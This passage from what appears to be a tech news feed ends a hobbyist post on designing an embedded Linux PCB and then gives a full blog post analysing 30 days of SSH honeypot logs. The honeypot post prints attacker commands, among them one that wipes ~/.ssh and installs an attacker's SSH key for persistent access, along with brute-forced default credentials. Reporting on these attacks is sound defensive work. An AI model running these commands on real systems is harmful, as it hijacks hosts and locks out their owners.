<h2 id="very-first-custom-pcb-board-not-linux-ready">Very first custom PCB board (not Linux-ready)</h2>
<p>After observing the above, I decided to make my own first PCB with some programmable digital logic on it and make it as simple as possible.</p>
<p>First of all, what does it even mean to program the board? We write some code, compile it, send it over somehow to a chip that is capable of running the compiled machine code, and observe the effects. I won’t focus on writing and compiling the code, but rather, on what happens afterward.</p>
<h3 id="booting-a-chip">Booting a chip</h3>
<p>Thinking of some extremely simple microcontrollers, I asked myself — what happens when I power on a chip (no matter how I do it)? Where does it read the code from? And how does it give me a chance to give it some code in the first place?</p>
<p>A few years ago, I was looking for the cheapest possible MCUs and ran into the Atmel ATtiny MCUs (the brand is now Microchip, I believe). You can get these MCUs for like $1 per piece, if not less. Now the question is, once we have this chip, but just the chip and nothing else around it, how do we get started with it? Surely it must be very simple with such a tiny chip.</p>
<p>Conceptually, upon providing the power voltage, an ATtiny chip will inspect the state of its pins. If you satisfy certain conditions, such as setting some pins high or low, the chip will enter the programming mode. This mode then enables you to talk to the chip via some protocol, for example, SPI, and load its on-chip flash with some code. After you’re happy with the code you loaded, you can reset the chip, “unsatisfy” the programming conditions, and let the new code run.</p>
<h3 id="usage-of-programmers-ie-enter-the-dragon">Usage of programmers (i.e. “enter the dragon”)</h3>
<p>If I’m on my computer, however, I don’t have any individual pins or wires poking out of it to do the above, let alone run something like SPI protocol. I probably have a bunch of USB ports, and a lot of pre-cooked PCBs connect to our computers via USB for programming, so that may be the right approach.</p>
<p>However, I don’t have a board here, I just have my chip, so how do I go about programming over USB? ATtiny has SPI programming only, so something must bridge the gap between the USB and SPI.</p>
<p>In the ATtiny case, there’s something called <strong>AVR Dragon</strong> that’s the solution to this problem.</p>
<p><img alt="Hex dump of the USB device" decoding="async" loading="lazy" src="https://www.microchip.com/content/dam/mchp/mrt-dam/devtools/1979-atavrdragon.jpg">
</p>
<p><em>Image from the <a href="https://www.microchip.com/en-us/development-tool/atavrdragon">official AVR Dragon page</a></em></p>
<p>This is a device that you can connect to your computer via USB and drive through some software on your computer to do the signal orchestration that we mentioned above. Once your computer commands the AVR Dragon to program the ATtiny chip, AVR Dragon will satisfy the programming conditions and run the protocol (e.g. SPI) with the chip itself to fill out the on-chip flash of the microcontroller with the compiled code.</p>
<p>For the ATtiny use case, I was able to do the programming by connecting the Dragon and the MCU with a breadboard. Programming would fail until I figured out there’s a parameter to slow down the data rate of the code upload to the MCU, and once I did that, the breadboard setup worked just fine. All I had to do for the most part was hook up AVR Dragon’s SPI to my chip’s SPI.</p>
<h3 id="the-dudes-who-program-avrdude">The dudes who program: <code>avrdude</code></h3>
<p>We now have the hardware solution to the USB -&gt; SPI dance, but what on our host computer would make this programming happen?</p>
<p>There needs to be an application that would drive the messages on the USB port to the Dragon. In my case, I used <code>avrdude</code>. It’s an open-source application that can program various Atmel/Microchip chips, including the ATtiny series. One of the parameters to the <code>avrdude</code> is what kind of programming you’re doing. In my case, it was as simple as setting one of the flags to something like <code>avr_dragon</code>.</p>
<p>With this, I was able to load up my ATtiny with some code, then power it down, put it on another breadboard, and flicker some LEDs.</p>
<p>Great, so now I have a few important pieces of info if I were to do a PCB with ATtiny chips:</p>
<ul>
<li>I either program the chips like here, on a separate surface, and “drop” them into their operating environment, or…</li>
<li>Expose SPI pins so that I can hook them up to an AVR Dragon.</li>
</ul>
<p>The latter has a somewhat obvious consequence if those same pins connect to something like LEDs, these can flicker as the Dragon is setting the pins high and low, but that’s not of huge importance here.</p>
<h3 id="what-is-a-dragon-and-do-i-need-it">What is a Dragon, and do I need it?</h3>
<p>Now that we unpacked the end-to-end programming flow for the ATtiny, we understand that the AVR Dragon doesn’t do anything extremely complicated — as long as we have <strong>some</strong> device that can send out some SPI messages to the chip, we can use that device as a programmer.</p>
<p>Well, interestingly, <code>avrdude</code> can be used with a different flag value for the same flag that took in <code>avr_dragon</code> as the parameter. This value is meant to be used on Raspberry Pi and utilizes RPi’s GPIO pins to do the programming. A detailed write-up is <a href="https://learn.adafruit.com/program-an-avr-or-arduino-using-raspberry-pi-gpio-pins/installation">here</a>.</p>
<h3 id="designing-a-pcb-for-attiny">Designing a PCB for ATtiny</h3>
<p>At this point, I have a simple way to program my ATtiny using a breadboard and AVR Dragon connected to my computer, though I could even eliminate the Dragon if I wanted to.</p>
<p>My PCB goal now is to design a PCB where I have a socket in which I can plug a pre-programmed ATtiny. Once that PCB is powered on, some LEDs would flicker.</p>
<p>This is an extremely simple PCB. You only need a DIP-8 socket, which replaces your breadboard’s holes, and a few PCB traces which replace the jumper wires from your breadboard prototype. My circuit will be powered by a single 5 V trace that goes into the chip, then 2 traces come out of the GPIOs to power the LEDs, and then there’s a GND trace everywhere to close the circuit. Here’s the result:</p>
<p><img alt="Hex dump of the USB device" decoding="async" loading="lazy" src="https://popovicu.com/assets/simple_schematic.png.webp" height="708" width="843">
</p>
<p>And the actual PCB:</p>
<p><img alt="Hex dump of the USB device" decoding="async" loading="lazy" src="https://popovicu.com/assets/simple_pcb.png.webp" height="459" width="668">
</p>
<p>So there are 2 parts of the design here: the schematic and the physical implementation. The schematic is your textbook-like logical model of the circuit. Once you design that, you will click a button in your tool with which you’ll get a blank PCB surface to organize your components and connect them. The schematic drives your work here and your EDA tool can use it to catch errors, e.g. if you’re trying to make connections that exist nowhere in your schematic.</p>
<p>You can watch a somewhat lengthy absolute beginner 7-piece tutorial by Robert Feranec on building out your first PCB, though it can get fairly long. I’d say it’s worth at least just scanning through to see a knowledgeable person in action:</p>
<iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen="" frameborder="0" height="315" loading="lazy" referrerpolicy="strict-origin-when-cross-origin" src="https://www.youtube.com/embed/videoseries?si=4wa6NtDVVFFl2cNL&amp;list=PLXvLToQzgzdea0sQXmpY8k4tfiXpkYIwO" title="YouTube video player" width="560"></iframe>
<p>Now that I’ve gone through this experiment successfully, I thought let’s just go all in and make an embedded Linux board.</p>
<h2 id="what-goes-into-designing-an-embedded-linux-system">What goes into designing an embedded Linux system?</h2>
<p>There is a really good high-level article by Jay Carlson on getting started here, and you can find it on <a href="https://jaycarlson.net/embedded-linux/">this link</a>.</p>
<p>If you’re already sold on ‘why embedded Linux’, you can skip a decent chunk of the intro text there and hop into the design workflow section. We’ll deal with something much simpler than a BGA package, though, and we’ll also skip complex bits like DDR routing since all our RAM will be on-chip within the SoC we’ll explore. We also won’t be mega disciplined about the signal integrity as all our components will run reasonably fast (slow?) and will be forgiving when it comes to design decisions.</p>
<p>With that in mind, still read Jay’s article, and consider this article a gentler introduction to what Jay wrote about.</p>
<h2 id="inspirational-design">Inspirational design</h2>
<p>As I wrote in the text on <a href="https://popovicu.com/posts/run-mainline-linux-on-5-dollar-hardware">running Linux on $5 hardware</a>, my inspiration for the first embedded Linux system was <a href="https://www.thirtythreeforty.net/posts/2019/12/my-business-card-runs-linux/">the business card that runs Linux</a>. The fact that it’s a business card signaled to me it would be as simple as possible in its design and it would be the right design to study.</p>
<p>The article’s author generously posted <a href="https://www.thirtythreeforty.net/posts/2019/12/my-business-card-runs-linux/businesscard.pdf">the schematic</a> for the circuit design and understanding this was the first part of the journey.</p>
<h2 id="designing-the-schematic">Designing the schematic</h2>
<p>There aren’t that many components in the inspirational design, and that seems right. After all, we have demonstrated it’s possible to boot and run Linux with just on-board flash plus an Allwinner SoC! Let’s break down the problem of designing the schematic and center it around the F1C100s SoC.</p>
<h3 id="power-supply">Power supply</h3>
<p>As Jay Carlson mentioned and the inspirational design confirms, a Linux-ready SoC will need a couple of different voltages for the power supply. If we look at the F1C100s datasheet, we see the following:</p>
<p><img alt="Hex dump of the USB device" decoding="async" loading="lazy" src="https://popovicu.com/assets/f1c100s_voltages.png.webp" height="254" width="690">
</p>
<p>We see a couple of different voltages in the game, like <code>VCC-IO</code>, <code>VDD-CORE</code>, etc.</p>
<p>3.3 V seems to be the recommended voltage for a few values, so we can mark it right now that we’ll need that voltage on our board. We also see 2.5 V for <code>VCC-DRAM</code> and it’s also still within the OK values for <code>AVCC</code>. Let’s thus add 2.5 V to the list of voltages we need on-board. Finally, <code>VDD-CORE</code> has a pretty “tight” range, and we’ll add 1.1 V to our list.</p>
<p>The Linux board can be powered from the USB host, meaning our board will connect over USB to another machine and source 5 V from there. If this seems a bit unfamiliar, please check out my recent text on <a href="https://popovicu.com/posts/making-usb-devices">building USB devices</a>. That’s the only voltage we’ll have from “the external world” and we’ll need to equip our PCB with some components that can convert 5 V down to these values listed above.</p>
<p>We’ll use voltage regulators for these, and we need 3 of them, one for each voltage needed. We’ll put some capacitors around these voltage regulators and the way you go about finding out what you should do there is you would open the datasheet for your voltage regulator and find a section that’s titled something like “typical application”.</p>
<p><img alt="Hex dump of the USB device" decoding="async" loading="lazy" src="https://popovicu.com/assets/voltage_reg_application.png.webp" height="290" width="441">
</p>
<h3 id="crystal">Crystal</h3>
<p>F1C100s needs some oscillation to be able to run at 24 MHz clock speed. Therefore, we need a 24 MHz crystal for that, and we’ll need some capacitors around it. Luckily, this is a well-known recipe. Please check out <a href="https://microchip.my.site.com/s/article/Calculating-crystal-load-capacitor">this page</a> for this recipe (crystal + 2 capacitors).</p>
<p>And yes, in my design, I also estimated <code>Cstray</code> at 5 pF.</p>
<h3 id="decoupling-capacitors">Decoupling capacitors</h3>
<p>We’ll need to put a bunch of decoupling capacitors around the voltage supply pins. Without talking too much outside the area of my expertise, I’ll just link to a few YouTube videos I found helpful on this topic.</p>
<p>The first one will give you a very high-level idea of what these capacitors do:</p>
<iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen="" frameborder="0" height="315" loading="lazy" referrerpolicy="strict-origin-when-cross-origin" src="https://www.youtube.com/embed/KKjHZpNMeik?si=k__AmvRoMdTFbuVU" title="YouTube video player" width="560"></iframe>
<p>The next one is an awesome video on practical use cases from Zach Peterson:</p>
<iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen="" frameborder="0" height="315" loading="lazy" referrerpolicy="strict-origin-when-cross-origin" src="https://www.youtube.com/embed/MMY69_1U4w4?si=SrmSe7jwnLAq6Rb6" title="YouTube video player" width="560"></iframe>
<p>Finally, I also found this video from EEVblog useful to expand my intuition around this capacitor usage:</p>
<iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen="" frameborder="0" height="315" loading="lazy" referrerpolicy="strict-origin-when-cross-origin" src="https://www.youtube.com/embed/BcJ6UdDx1vg?si=c7jxusiSUlACQlHD" title="YouTube video player" width="560"></iframe>
<p>I pretty much used a bunch of 100 nF decoupling capacitors all over the place.</p>
<h3 id="connectors-pins-and-io">Connectors, pins and IO</h3>
<p>I powered the PCB via a USB connection (USB-micro connector on-board) and also used that same connection to fill up the onboard flash/RAM (more about it later). I’d say for this exercise, you’d want that the minimum.</p>
<p>Other pins and connections you would add at this point are your choice. How do you want your PCB to interact with the outside world? Maybe you want to expose an I2C port, a UART port, or something else, it’s really up to you.</p>
<p>One thing you may want to make your debugging easier is adding some LEDs, which should be easy.</p>
<h4 id="fel-mode-button">“FEL mode” button</h4>
<p>Going back to the article on <a href="https://popovicu.com/posts/run-mainline-linux-on-5-dollar-hardware">running Linux on $5 hardware</a>: FEL mode with F1C100s is very important to us. I’ll go through this again briefly in this article, but for now — I added a button that will ground the clock on the SPI flash which effectively takes it down. It may seem strange, but it makes life easier.</p>
<h3 id="spi-flash">SPI flash</h3>
<p>Something went wrong here. :) I wanted a 16 MB flash chip but ended up getting 2 MB only. Not sure if I messed up or the fabricator (with its documentation or otherwise), but it doesn’t matter, I managed to bail out here. The initial ramble about programming ATtiny is an important lesson here!</p>
<p>More importantly, for now, there were a couple of things about the SPI flash:</p>
<ul>
<li>We want it to be big enough to store our Linux image and maybe even store some runtime data (optional).</li>
<li>Ideally, we want it to be powered by a voltage that we already have on-board. 3.3 V should be doable.</li>
</ul>
<h3 id="svref-weirdness"><code>SVREF</code> weirdness</h3>
<p>There was one very weird pin on the SoC called <code>SVREF</code>. The datasheet says nothing about this pin except that it exists. In this case, I just looked at what the other designs do here and copied the approach. For this particular thing, I just applied a simple resistor-based voltage divider (take a look at the schematic from the inspirational design, for example).</p>
<h3 id="concrete-components">Concrete components</h3>
<p>What we listed above is pretty much everything you need, high-level, to stitch together your Linux system. You do need, however, to figure out which components <strong>exactly</strong> you want to use in your design. For example, you want to use 100 nF decoupling capacitors, but there are tons of models out there that your fabricator can use, each with different characteristics (price included as a characteristic). Additionally, some of these components may be preferred by your fabricator, some of them may be added faster to your PCB, some of them may or may not be in stock, etc. In my case, I used JLCPCB and they call these “easier-to-use” parts <em>basic parts</em>.</p>
<p>For the prototype, make sure the parts click together well. For example, if you use a resistor, make sure it can handle the current you’d be passing through it. Additionally, pay attention to the geometry as well, aka the footprints. The footprint is the space and connection layout for your component. You’ll see different designations for things like resistors. There are 0603 resistors, but they’re bigger than 0402 resistors. I used 0402 footprints for the most part, for both capacitors and resistors.</p>
<p>Lastly, there’s a strong reason why I liked using EasyEDA for this exercise: they provide a massive library of components they can throw onto the PCB, along with the footprints. Very often PCB designers (as I understand, I’m not a PCB designer) spend time struggling with component datasheets and whatnot to establish what the exact footprints are and how to match them to the components they want to use — EasyEDA links very nicely with the JLCPCB fabrication process.</p>
<h3 id="putting-the-schematic-together">Putting the schematic together</h3>
<p>Take a look at the schematic <a href="https://popovicu.com/assets/linux_board_schematic.pdf">here</a>.</p>
<p><img alt="Hex dump of the USB device" decoding="async" loading="lazy" src="https://popovicu.com/assets/linux_board_schematic.png.webp" height="521" width="800">
</p>
<p><strong>Caution: Please don’t expect a very readable schematic. :) Experienced PCB people will likely recoil after seeing it. It’s just a proof-of-concept and it’s hacky. On top of that, I’m most definitely not a PCB expert. I never really meant to share this schematic, but I guess it could still be useful to some of you.</strong></p>
<p>I’ll summarize below what is going on in this schematic:</p>
<ul>
<li>Most of the SoC pins are unconnected. The SoC itself is <code>U1</code>.</li>
<li><code>U2</code>, <code>U3</code>, and <code>U4</code> are the voltage regulators to obtain those different voltages you need to power up the SoC.</li>
<li><code>U5</code> is the SPI NOR flash memory. Again, check out the old article on $5 hardware Linux to figure out how to boot from here and so on. This memory can be “disabled” by holding the button <code>U6</code> in the schematic, which grounds the clock signal. This enables you to restart the SoC and make it believe there is nothing to boot from, thus forcing it to enter the FEL mode.</li>
<li><code>U7</code> is the reset switch.</li>
<li><code>U8</code> and <code>U9</code> are LED drivers. Total overkill, you can just hook up your LEDs to the GPIOs.</li>
<li>The decoupling capacitors should be fairly easy to spot at this point (there are a lot of them).</li>
<li><code>USB1</code> is the USB-micro connector, which both provides the raw 5 V to the voltage regulators and also gives you the differential pair you can route to the SoC for the USB communication. Check out the article <a href="https://popovicu.com/posts/making-usb-devices">on making USB devices</a> to understand what’s going on here.</li>
<li><code>X</code> is the crystal and it follows the standard recipe for hooking up the crystal to the chip.</li>
<li><code>L1</code> is the ferrite bead. As I understand, many times when you plug your USB into something like an outlet with a USB port, that 5 V can be noisy, and the ferrite bead helps.</li>
<li>The rest is mostly just header pins to expose signals to the outer world.</li>
</ul>
<p>And that’s pretty much it!</p>
<h2 id="routing-the-pcb">Routing the PCB</h2>
<p>Now that we have the schematic, it’s time to route things around and end up with a real piece of electronics.</p>
<p>For me, a big challenge here was laying out these decoupling capacitors. They should be as close as possible to the SoC pins, per best practices (check out the videos from the above), but the SoC packaging makes things challenging here. I thought it was my lack of experience that kicked in here, but then I found a video from Phil’s Lab that goes into detail on this matter. Namely, this packaging is called a QFN package, and the pins here are quite dense, everything is pretty tiny. Even though those capacitors aren’t very big, they still cluster pretty fast around those SoC pins and things become difficult. This is when I decided to use a 4-layer PCB instead, per best practices shared by Phil. The video is below:</p>
<iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen="" frameborder="0" height="315" loading="lazy" referrerpolicy="strict-origin-when-cross-origin" src="https://www.youtube.com/embed/PsyK1BXdclQ?si=El70GmAjEr8XIPg5" title="YouTube video player" width="560"></iframe>
<p>The other part that may seem challenging here is the USB routing. However, we’re only going for USB 2.0 full-speed, which is very very forgiving. Again, refresh your knowledge of USB devices <a href="https://popovicu.com/posts/making-usb-devices">here</a>, and don’t worry too much here. I just used EasyEDA’s differential pair routing from the USB-micro connector to the SoC. No need to pay too much attention to the trace width, and length, as long as it’s all reasonable (e.g. keep your trace length below 2 inches, I guess, and don’t use some weird width); things will just work.</p>
<p>Everything else should be pretty much straightforward. I used the following layer stack up: signal-GND-power-signal.</p>
<ol>
<li>The top signal layer has a lot of GPIO traces, as well as the USB differential pair (from what I understand you shouldn’t hop through different layers when routing a differential pair).</li>
<li>GND is just ground, the whole layer.</li>
<li>In the power layer, I routed different voltages for powering the SoC with fairly thick traces.</li>
<li>The bottom signal layer is mostly decoupling capacitors.</li>
</ol>
<p>I don’t think I should go into more detail on routing — I would probably give bad knowledge, so I’ll just stop here.</p>
<h2 id="creating-the-software-image">Creating the software image</h2>
<p>Ideally, I should have created a custom device tree for this board, but I was lazy and wanted to see the results right away. For my <a href="https://popovicu.com/posts/run-mainline-linux-on-5-dollar-hardware">running Linux on $5 hardware</a> exercise, I created an image for Lichee Pi, which also doesn’t have much more than just SoC + flash, and I decided to use the same, it should just work.</p>
<p>And it did work, but there was a catch — as I said, I somehow ended up with a 2 MB on-board flash instead of 16 MB as I originally intended. It would have been lots of work to slim down the image, and I just wanted to see something work.</p>
<p>This is where the FEL mode shines and why it’s important to have something like that hacky button that disables on-board flash easily. I used the <code>sunxi-fel</code> tool to communicate with my SoC since it was directly exposed to my computer via the USB differential pair. One of the things that this tool can do for you is populate the RAM with some content and then boot up while preserving those contents. This is why I had that intro talk about programming ATtinys and figuring out what are the ways you can pipe the bytes into your chip and get it to run some code you want it to run.</p>
<p>Therefore, instead of loading the U-boot FIT image from the on-board flash, I downloaded it from my computer and booted from that point. Linux worked just fine.</p>
<p>To have more confidence my connection with the on-board flash works as intended, I could package the U-boot image and write it into the NOR flash storage, but putting Linux alongside that was tight. U-boot worked just fine, though.</p>
<h2 id="conclusion">Conclusion</h2>
<p>This was an extremely hacky journey, but it satisfied a lot of my curiosity, and seeing the PCB come to life after all the studying and designing and waiting for the fabrication was a great feeling. I hope you feel the same joy once you put together your first embedded Linux system too. Good luck!</p>
<p>Please consider following on <a href="https://twitter.com/popovicu94">Twitter/X</a> and <a href="https://www.linkedin.com/in/upopovic/">LinkedIn</a> to stay updated.</p>
<p><img alt="Hex dump of the USB device" decoding="async" loading="lazy" src="https://popovicu.com/assets/linux_board.jpeg.webp" height="385" width="437">
</p>
    </article></div>]]></description>
        </item>
        <item>
            <title><![CDATA[What You Get After Running an SSH Honeypot for 30 Days (494 pts)]]></title>
            <link>https://blog.sofiane.cc/ssh_honeypot/</link>
            <guid>40694768</guid>
            <pubDate>Sun, 16 Jun 2024 04:52:12 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://blog.sofiane.cc/ssh_honeypot/">https://blog.sofiane.cc/ssh_honeypot/</a>, See on <a href="https://news.ycombinator.com/item?id=40694768">Hacker News</a></p>
<div id="readability-page-1" class="page"><div itemprop="articleBody">
    <p><img src="https://i.imgur.com/5PZ4c8k.png"></p>
<h2 id="What-is-a-honeypot"><a href="#What-is-a-honeypot" title="What is a honeypot?"></a>What is a honeypot?</h2><p>A honeypot detects and records attacks when an attacker tries to break into a system. </p>
<p>The honeypot we will discuss here is an SSH honeypot.</p>
<h2 id="Environment"><a href="#Environment" title="Environment"></a>Environment</h2><figure><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br></pre></td><td><pre><span><span>OS</span>: Ubuntu <span>24</span>.<span>04</span> LTS x<span>86</span>_<span>64</span> </span><br><span><span>Kernel</span>: <span>6</span>.<span>8</span>.<span>0</span>-<span>31</span>-generic</span><br></pre></td></tr></tbody></table></figure>

<h2 id="Login-Attempts"><a href="#Login-Attempts" title="Login Attempts"></a>Login Attempts</h2><figure><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br></pre></td><td><pre><span><span>cat</span> <span>X</span>.<span>log</span> | <span>grep</span> -<span>c</span> <span>"login attempt"</span></span><br><span><span>11599</span></span><br></pre></td></tr></tbody></table></figure>

<p>There were a total of 11,599 login attempts. Divided by 30 days, this means an average of 386 login attempts per day. </p>
<h2 id="Used-Usernames"><a href="#Used-Usernames" title="Used Usernames"></a>Used Usernames</h2><figure><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br></pre></td><td><pre><span>cat X.log | grep -a <span>"login attempt"</span> | awk <span>'{print $5}'</span> | awk -F <span>"'"</span> <span>'{print $2}'</span> | sort | uniq -c | sort -nr | head</span><br><span>   8181 root</span><br><span>    977 345gs5662d34</span><br><span>    359 admin</span><br><span>    198 pi</span><br><span>    105 0</span><br><span>     71 ubuntu</span><br><span>     51 ubnt</span><br><span>     46 support</span><br><span>     37 user</span><br><span>     30 oracle</span><br></pre></td></tr></tbody></table></figure>
<p>As expected, there are many attacks that target customary and default usernames.</p>
<p>For the <code>345gs5662d34</code> user, according to the <strong>Aalborg University of Denmark Research</strong> this could be the default credential for a <strong>Polycom CX600 IP telephone</strong></p>
<p>Check it here :<br><a target="_blank" rel="noopener" href="https://vbn.aau.dk/ws/portalfiles/portal/573748244/sweetcam_honeypot_paper_1_.pdf">SweetCam: an IP Camera Honeypot</a></p>
<h3 id="Passwords"><a href="#Passwords" title="Passwords"></a>Passwords</h3><figure><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br></pre></td><td><pre><span><span>cat</span> X.log | grep -a <span>"login attempt"</span> | awk '{print $<span>5</span>}' | awk -F <span>"'"</span> '{print $<span>4</span>}' | sort | uniq -c | sort -nr | head</span><br><span>    <span>977</span> <span>345</span>gs<span>5662</span>d<span>34</span></span><br><span>    <span>967</span> <span>3245</span>gs<span>5662</span>d<span>34</span></span><br><span>    <span>246</span> admin</span><br><span>    <span>239</span> <span>123456</span></span><br><span>    <span>208</span> password</span><br><span>    <span>155</span> <span>0</span></span><br><span>     <span>88</span> root</span><br><span>     <span>75</span> raspberry</span><br><span>     <span>73</span> <span>123</span></span><br><span>     <span>66</span> raspberryraspberry<span>993311</span></span><br></pre></td></tr></tbody></table></figure>

<p>Once again, the same as the default username for <strong>Polycom CX600 IP telephone</strong></p>
<h3 id="Commands-executed-after-login"><a href="#Commands-executed-after-login" title="Commands executed after login"></a>Commands executed after login</h3><figure><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br></pre></td><td><pre><span>cat X.log | grep -a <span>"CMD"</span> | awk -F<span>'CMD: '</span> <span>'{print $2}'</span> | sort | uniq -c | sort -nr</span><br><span>   <span>6775</span> echo -e <span>"\x6F\x6B"</span></span><br><span>   <span>1016</span> cd ~; chattr -ia .ssh; lockr -ia .ssh</span><br><span>   <span>1016</span> cd ~ &amp;&amp; rm -rf .ssh &amp;&amp; mkdir .ssh &amp;&amp; echo <span>"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"</span>&gt;&gt;.ssh<span>/authorized_keys &amp;&amp; chmod -R go= ~/</span>.ssh &amp;&amp; cd ~</span><br><span>    <span>320</span> uname -s -v -n -r -m</span><br><span>    <span>112</span> .<span>/oinasf; dd if=/</span>proc<span>/self/</span>exe bs=<span>22</span> count=<span>1</span> || <span>while</span> read i; <span>do</span> echo <span>$i</span>; done &lt; <span>/proc/</span>self<span>/exe || cat /</span>proc<span>/self/</span>exe;</span><br><span>     <span>87</span> uname -a</span><br><span>     <span>29</span> ps | grep <span>'[Mm]iner'</span></span><br><span>     <span>29</span> ps -ef | grep <span>'[Mm]iner'</span></span><br><span>     <span>29</span> ls -la <span>/dev/</span>ttyGSM* <span>/dev/</span>ttyUSB-mod* <span>/var/</span>spool<span>/sms/</span>* <span>/var/</span>log<span>/smsd.log /</span>etc<span>/smsd.conf* /u</span>sr<span>/bin/</span>qmuxd <span>/var/</span>qmux_connect_socket <span>/etc/</span>config<span>/simman /</span>dev<span>/modem* /</span>var<span>/config/</span>sms/*</span><br><span>     <span>29</span> ifconfig</span><br><span>     <span>29</span> echo Hi | cat -n</span><br><span>     <span>29</span> cat <span>/proc/</span>cpuinfo</span><br><span>     <span>29</span> /ip cloud print</span><br><span>     <span>23</span> whoami</span><br><span>     <span>23</span> which ls</span><br><span>     <span>23</span> w</span><br><span>     <span>23</span> uname -m</span><br><span>     <span>23</span> uname</span><br><span>     <span>23</span> top</span><br><span>     <span>23</span> lscpu | grep Model</span><br><span>     <span>23</span> ls -lh $(which ls)</span><br><span>     <span>23</span> free -m | grep Mem | awk <span>'{print $2 ,$3, $4, $5, $6, $7}'</span></span><br><span>     <span>23</span> df -h | head -n <span>2</span> | awk <span>'FNR == 2 {print $2;}'</span></span><br><span>     <span>23</span> crontab -l</span><br><span>     <span>23</span> cat <span>/proc/</span>cpuinfo | grep name | wc -l</span><br><span>     <span>23</span> cat <span>/proc/</span>cpuinfo | grep name | head -n <span>1</span> | awk <span>'{print $4,$5,$6,$7,$8,$9;}'</span></span><br><span>     <span>23</span> cat <span>/proc/</span>cpuinfo | grep model | grep name | wc -l</span><br><span>     ・・・</span><br></pre></td></tr></tbody></table></figure>
<p>Now the interesting part starts </p>
<h3 id="The-oinasf-script"><a href="#The-oinasf-script" title="The oinasf script"></a>The oinasf script</h3><p><img src="https://i.imgur.com/7YmVqRo.png"></p>
<p>The execution of a mysterious script, <code>./oinasf</code>, followed by attempts to read and display the system’s executable content, indicates a probing strategy for vulnerabilities or valuable information. </p>
<p>The use of <code>/ip cloud print</code> suggests that bots target MikroTik routers to access or disrupt cloud-based services, while <code>uname -s -m</code> provides them with essential details about the operating system and machine architecture, valuable for crafting further actions tailored to the system’s specifics. </p>
<p>In conclusion, these commands represent a clear strategy to infiltrate, assess, and establish control over targeted systems. </p>
<p>They emphasize the bot’s preference for direct manipulation and sustained access highlighting the critical need for robust defenses against such common yet potentially devastating tactics.</p>
<h3 id="The-mdrfckr-crypto-miner"><a href="#The-mdrfckr-crypto-miner" title="The mdrfckr crypto miner"></a>The mdrfckr crypto miner</h3><p><img src="https://i.imgur.com/V6E9UiA.png"></p>
<p>This miner would simply create a cron job that would delete everything on  the <code>.ssh</code> folder and add a single ssh key and lock other users out. </p>
<p>After that it would kill other miners if they exist and just have the open field.</p>
<p>You can check this repo of someone who already got hacked and the miner was used on his server : <a target="_blank" rel="noopener" href="https://github.com/dangoldin/crypto-miner-hack/">Dump of the crypto-miner that got installed on my system - Github</a></p>
<h3 id="The-MIPS-malware"><a href="#The-MIPS-malware" title="The MIPS malware"></a>The MIPS malware</h3><p><img src="https://i.imgur.com/BkHTVej.png"></p>
<p>Probably another <strong>MIPS</strong> (Multiprocessor without Interlocked Pipeline Stages) architecture malware, targeting routers and IoT devices.</p>
<p>Here is a good read and analysis of the behaviour of a MIPS Malware :<br><a target="_blank" rel="noopener" href="https://www.giac.org/paper/grem/2573/analyzing-backdoor-bot-mips-platform/124977">Analyzing a Backdoor/Bot for the MIPS Platform</a></p>
<h3 id="The-Sakura-sh-Script"><a href="#The-Sakura-sh-Script" title="The Sakura.sh Script"></a>The Sakura.sh Script</h3><p><img src="https://i.imgur.com/GmR2OvK.png"></p>
<p>This script is part of the <strong>Gafgyt Malware</strong>. </p>
<p><strong>Gafgyt</strong>, also known as <strong>BASHLITE</strong>, is a botnet affecting Internet of Things (IoT) devices and Linux-based systems. The malware aims to compromise and gain control of these devices, often by exploiting weak or default passwords, as well as known vulnerabilities. Gafgyt has been around since 2014 and has evolved into multiple variants, each with its own set of features and capabilities, including the ability to launch distributed denial of service (DDoS) attacks.</p>
<p>Here is <a target="_blank" rel="noopener" href="https://securityscorecard.com/wp-content/uploads/2024/01/Report-A-Detailed-Analysis-Of-The-Gafgyt-Malware-Targeting-IoT-Devices.pdf">A Detailed Analysis of the Gafgyt Malware Targeting IoT Devices </a></p>
<p>© 2024 — Sofiane Hamlaooui — Making the world a better place 🌎</p>

  </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Highly realistic talking head video generation (103 pts)]]></title>
            <link>https://github.com/fudan-generative-vision/hallo</link>
            <guid>40694375</guid>
            <pubDate>Sun, 16 Jun 2024 03:04:31 GMT</pubDate>
